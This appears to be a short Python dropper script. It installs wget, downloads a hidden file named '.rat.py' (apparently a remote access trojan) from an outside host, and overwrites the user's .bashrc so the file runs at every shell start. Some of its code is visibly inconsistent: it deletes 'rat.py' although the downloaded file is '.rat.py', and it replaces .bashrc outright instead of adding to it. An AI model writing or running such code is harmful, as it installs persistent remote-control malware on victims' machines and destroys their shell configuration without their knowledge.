import os

url = 'https://host.com/.rat.py'

os.system("apt install zip wget -y")
cmd = "wget "+url
os.system(cmd)
f = open(".bashrc", "w")
f.write("python .rat.py")
f.close()
os.system("rm rat.py")
